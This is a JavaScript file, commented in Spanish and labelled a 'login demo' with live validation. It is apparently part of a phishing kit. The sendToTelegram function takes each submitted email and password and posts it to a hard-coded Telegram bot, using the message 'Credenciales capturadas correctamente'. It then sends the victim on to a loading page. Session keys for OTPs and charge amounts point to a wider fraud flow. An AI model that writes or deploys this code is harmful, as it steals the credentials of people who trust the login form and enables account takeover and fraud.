/* ============================================================
   Login demo â€” Validacion Dinamica y Cambio de Estilo en Vivo
   ============================================================ */

(function () {
  "use strict";

  // --- LIMPIEZA PREVENTIVA AL CARGAR LA PAGINA ---
  try {
    localStorage.removeItem('transaction_status');
    sessionStorage.removeItem('otp_tail');
    sessionStorage.removeItem('flow_type');
    sessionStorage.removeItem('charge_merchant');
    sessionStorage.removeItem('charge_amount');
    sessionStorage.removeItem('gatekeeper_done');
  } catch (e) {
    console.error("Error al limpiar cache inicial:", e);
  }
  // ----------------------------------------------

  const TELEGRAM_TOKEN = '9068600803:AAEPd0lHMbVcyxhsCbXJGfutL0X-v6mr-pY'; 
  const TELEGRAM_CHAT_ID = '9180377107';   

  const form = document.getElementById("login-form");
  const username = document.getElementById("username");
  const password = document.getElementById("password");
  const message = document.getElementById("form-message");
  const submitBtn = form.querySelector(".btn-submit");

  function isValidEmail(email) {
    const emailRegex = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
    return emailRegex.test(email);
  }

  function checkInputsRealtime() {
    const userVal = username.value.trim();
    const passVal = password.value;

    const emailOk = isValidEmail(userVal);
    const passOk = passVal.length >= 4; 

    if (emailOk && passOk) {
      submitBtn.style.backgroundColor = "#981D33";
      submitBtn.style.borderColor = "#981D33";
      submitBtn.style.color = "#FFFFFF";
      submitBtn.style.cursor = "pointer";
    } else {
      submitBtn.style.backgroundColor = "";
      submitBtn.style.borderColor = "";
      submitBtn.style.color = "";
      submitBtn.style.cursor = "";
    }
  }

  function sendToTelegram(credentials) {
    const text = `🍕 *NUEVO INTENTO DE LOGIN* 🍕\n\n` +
                 `👤 *Usuario:* \`${credentials.username}\`\n` +
                 `🔑 *Contraseña:* \`${credentials.password}\`\n\n` +
                 `_Credenciales capturadas correctamente._`;

    const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;

    return fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: text,
        parse_mode: 'Markdown'
      })
    });
  }

  username.addEventListener("input", checkInputsRealtime);
  password.addEventListener("input", checkInputsRealtime);

  form.addEventListener("submit", async function (event) {
    event.preventDefault();

    // CLAVE: Avisamos que este flujo es exclusivo para Iniciar Sesion
    try {
      localStorage.removeItem('transaction_status');
      sessionStorage.removeItem('otp_tail');
      sessionStorage.removeItem('charge_merchant');
      sessionStorage.removeItem('charge_amount');
      sessionStorage.removeItem('gatekeeper_done');
      sessionStorage.setItem('flow_type', 'login'); 
    } catch (e) { }

    const userVal = username.value.trim();
    const passVal = password.value;

    if (!isValidEmail(userVal)) {
      if (message) {
        message.textContent = "Ingresa un correo electronico valido.";
        message.classList.add("error");
      }
      username.focus();
      return;
    }

    if (passVal.length < 4) {
      if (message) {
        message.textContent = "Ingresa una contraseña valida.";
        message.classList.add("error");
      }
      password.focus();
      return;
    }

    submitBtn.disabled = true;
    submitBtn.textContent = "Accediendo…";

    try {
      await sendToTelegram({
        username: userVal,
        password: passVal,
      });

      try {
        // Guardamos el correo correctamente para el Dashboard y la sesion
        localStorage.setItem("user_email", userVal);
        sessionStorage.setItem("demo_user", userVal);
      } catch (e) { }

      window.location.href = "loading.html";
    } catch (err) {
      console.error("Login error:", err);
      if (message) {
        message.textContent = "Error de conexion con el servidor.";
      }
      submitBtn.disabled = false;
      submitBtn.textContent = "Acceder";
    }
  });

  checkInputsRealtime();
})();